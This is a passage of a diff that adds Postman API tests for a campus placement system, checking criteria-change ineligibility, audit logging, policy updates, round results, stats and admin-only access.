+          "name": "Student 3: CGPA below the new minimum (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{avApp3}}",
+            "header": [],
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken3}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 INELIGIBLE with the CGPA reason', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('INELIGIBLE');",
+                  "  pm.expect(b.statusReason).to.eql('Drive criteria changed: Minimum CGPA is 7.00; yours is 6.80');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: loosen the criteria again, nothing is restored (one-way) (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roleTitle\": \"Data Engineer\",\n  \"jobType\": \"FULL_TIME\",\n  \"ctcLpa\": 10,\n  \"location\": \"Hyderabad\",\n  \"description\": \"Postman admin-views drive\",\n  \"minCgpa\": 6.5,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{avDeadline}}\",\n  \"branches\": [\n    \"CSE\",\n    \"IT\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 with applicationsMadeIneligible = 0', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().applicationsMadeIneligible).to.eql(0);",
+                  "});",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/drives/' + pm.collectionVariables.get('avDrive')",
+                  "    + '/applications?status=INELIGIBLE',",
+                  "  header: { Authorization: 'Bearer ' + pm.collectionVariables.get('adminToken') }",
+                  "}, (err, res) => {",
+                  "  pm.test('both applications stay INELIGIBLE', () => pm.expect(res.json().totalElements).to.eql(2));",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: GET a drive has no applicationsMadeIneligible field (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('field only in the PUT response', () => pm.expect(pm.response.json()).to.not.have.property('applicationsMadeIneligible'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: audit of the drive, newest first, changed fields old -> new (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?entityType=DRIVE&entityId={{avDrive}}",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, two CRITERIA_CHANGED rows, newest first', () => {",
+                  "  const rows = pm.response.json().content;",
+                  "  pm.expect(rows).to.have.length(2);",
+                  "  pm.expect(rows.every(r => r.action === 'CRITERIA_CHANGED')).to.be.true;",
+                  "  pm.expect(new Date(rows[0].createdAt) >= new Date(rows[1].createdAt)).to.be.true;",
+                  "});",
+                  "pm.test('the tightening row: old -> new values as JSON, with the effect', () => {",
+                  "  const tighten = pm.response.json().content[1];",
+                  "  pm.expect(tighten.oldValue.minCgpa).to.eql(6.5);",
+                  "  pm.expect(tighten.newValue.minCgpa).to.eql(7.0);",
+                  "  pm.expect(tighten.oldValue.branches).to.eql(['CSE', 'IT']);",
+                  "  pm.expect(tighten.newValue.branches).to.eql(['CSE']);",
+                  "  pm.expect(tighten.newValue.applicationsMadeIneligible).to.eql(2);",
+                  "  pm.expect(tighten.oldValue).to.not.have.property('roleTitle');",
+                  "  pm.expect(tighten.actorEmail).to.eql('admin@placementhub.dev');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: audit of student 2's application (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?entityType=APPLICATION&entityId={{avApp2}}",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: INELIGIBLE by CRITERIA_CHANGE (admin), after the APPLY (student)', () => {",
+                  "  const rows = pm.response.json().content;",
+                  "  pm.expect(rows.map(r => r.newValue.trigger)).to.eql(['CRITERIA_CHANGE', 'APPLY']);",
+                  "  pm.expect(rows[0].oldValue.status).to.eql('APPLIED');",
+                  "  pm.expect(rows[0].newValue.status).to.eql('INELIGIBLE');",
+                  "  pm.expect(rows[0].actorEmail).to.eql('admin@placementhub.dev');",
+                  "  pm.expect(rows[1].oldValue).to.eql(null);",
+                  "  pm.expect(rows[1].actorEmail).to.eql(pm.collectionVariables.get('avEmail2'));",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: audit since this folder started, all newest first (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?from={{avSince}}&size=100",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: every row is after from, sorted newest first', () => {",
+                  "  const rows = pm.response.json().content;",
+                  "  const since = new Date(pm.collectionVariables.get('avSince'));",
+                  "  pm.expect(rows.length).to.be.above(5);",
+                  "  rows.forEach(r => pm.expect(new Date(r.createdAt) >= since).to.be.true);",
+                  "  for (let i = 1; i < rows.length; i++) {",
+                  "    pm.expect(new Date(rows[i - 1].createdAt) >= new Date(rows[i].createdAt)).to.be.true;",
+                  "  }",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: audit with entityId but no entityType (400)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?entityId=1",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400', () => {",
+                  "  pm.response.to.have.status(400);",
+                  "  pm.expect(pm.response.json().message).to.include('entityId needs entityType');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: audit with from after to (400)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?from=2026-11-02T00:00:00Z&to=2026-11-01T00:00:00Z",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: audit with a malformed date (400)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?from=yesterday",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Student: audit log is admin-only (403)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit",
+            "header": [],
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: change DREAM_OFFER threshold to 11 (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/DREAM_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": true,\n  \"ctcThresholdLpa\": 11\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.expect(pm.response.json().ctcThresholdLpa).to.eql(11));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: the policy change is audited old -> new (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?entityType=POLICY&size=1",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: POLICY_CHANGED 10.00 -> 11.00', () => {",
+                  "  const row = pm.response.json().content[0];",
+                  "  pm.expect(row.action).to.eql('POLICY_CHANGED');",
+                  "  pm.expect(row.oldValue).to.include({ type: 'DREAM_OFFER', active: true, ctcThresholdLpa: 10 });",
+                  "  pm.expect(row.newValue.ctcThresholdLpa).to.eql(11);",
+                  "  pm.collectionVariables.set('avPolicyAuditId', row.id);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Restore: DREAM_OFFER back to 10 (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/DREAM_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": true,\n  \"ctcThresholdLpa\": 10\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.expect(pm.response.json().ctcThresholdLpa).to.eql(10));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: saving the same policy again writes no audit row (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/DREAM_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": true,\n  \"ctcThresholdLpa\": 10\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.response.to.have.status(200));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/audit?entityType=POLICY&size=2',",
+                  "  header: { Authorization: 'Bearer ' + pm.collectionVariables.get('adminToken') }",
+                  "}, (err, res) => {",
+                  "  pm.test('newest policy row is the restore, then the change: no row for the no-op', () => {",
+                  "    const rows = res.json().content;",
+                  "    pm.expect(rows[0].newValue.ctcThresholdLpa).to.eql(10);",
+                  "    pm.expect(rows[1].id).to.eql(Number(pm.collectionVariables.get('avPolicyAuditId')));",
+                  "  });",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: close the drive (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/close",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 CLOSED', () => pm.expect(pm.response.json().status).to.eql('CLOSED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: add Round 1 (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/rounds",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roundNo\": 1,\n  \"name\": \"Aptitude\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('avRound1', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: Round 1 result for student 1, CLEARED (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/rounds/{{avRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{avApp1}}, \"result\": \"CLEARED\", \"remarks\": \"Good\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 SHORTLISTED', () => pm.expect(pm.response.json().results[0].applicationStatus).to.eql('SHORTLISTED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: remarks-only correction (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/rounds/{{avRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{avApp1}}, \"result\": \"CLEARED\", \"remarks\": \"Top 10%\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.expect(pm.response.json().results[0].remarks).to.eql('Top 10%'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: both result writes are audited, the status change only once (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/audit?entityType=ROUND_RESULT&size=2",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: RESULT_CHANGED new result, then the remarks correction', () => {",
+                  "  const rows = pm.response.json().content;",
+                  "  pm.expect(rows.map(r => r.action)).to.eql(['RESULT_CHANGED', 'RESULT_CHANGED']);",
+                  "  pm.expect(rows[0].oldValue.remarks).to.eql('Good');",
+                  "  pm.expect(rows[0].newValue).to.include({ applicationId: Number(pm.collectionVariables.get('avApp1')), roundNo: 1, result: 'CLEARED', remarks: 'Top 10%' });",
+                  "  pm.expect(rows[1].oldValue).to.eql(null);",
+                  "});",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/audit?entityType=APPLICATION&entityId=' + pm.collectionVariables.get('avApp1'),",
+                  "  header: { Authorization: 'Bearer ' + pm.collectionVariables.get('adminToken') }",
+                  "}, (err, res) => {",
+                  "  pm.test('one SHORTLISTED status row, not two', () => {",
+                  "    pm.expect(res.json().content.map(r => r.newValue.status)).to.eql(['SHORTLISTED', 'APPLIED']);",
+                  "  });",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: applicants list shows the latest round (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?status=SHORTLISTED",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, Round 1 CLEARED with remarks', () => {",
+                  "  const r = pm.response.json().content[0];",
+                  "  pm.expect(r.progress).to.eql({ totalRounds: 1, latestRound: { roundNo: 1, name: 'Aptitude', result: 'CLEARED', remarks: 'Top 10%' } });",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: placement stats (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/stats",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 with every section', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b).to.have.all.keys('totalStudents', 'placedStudents', 'placementPercentage', 'branches',",
+                  "    'offersByCompany', 'ctc', 'drivesByStatus');",
+                  "  pm.expect(b.ctc).to.have.all.keys('highestLpa', 'averageLpa', 'medianLpa');",
+                  "  pm.expect(b.drivesByStatus).to.have.all.keys('DRAFT', 'OPEN', 'CLOSED', 'COMPLETED');",
+                  "});",
+                  "pm.test('numbers add up', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.totalStudents).to.be.at.least(3);",
+                  "  pm.expect(b.branches.reduce((s, r) => s + r.totalStudents, 0)).to.eql(b.totalStudents);",
+                  "  pm.expect(b.branches.reduce((s, r) => s + r.placedStudents, 0)).to.eql(b.placedStudents);",
+                  "  const expected = Math.round(b.placedStudents * 10000 / b.totalStudents) / 100;",
+                  "  pm.expect(b.placementPercentage).to.be.closeTo(expected, 0.01);",
+                  "  pm.expect(b.drivesByStatus.CLOSED).to.be.at.least(1);",
+                  "  if (b.placedStudents > 0) {",
+                  "    pm.expect(b.ctc.highestLpa).to.be.at.least(b.ctc.medianLpa);",
+                  "    pm.expect(b.ctc.highestLpa).to.be.at.least(b.ctc.averageLpa);",
+                  "  }",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Student: stats are admin-only (403)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/stats",
+            "header": [],
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Cleanup: complete the drive (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/complete",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 COMPLETED', () => pm.expect(pm.response.json().status).to.eql('COMPLETED'));"
                 ]
               }
             }
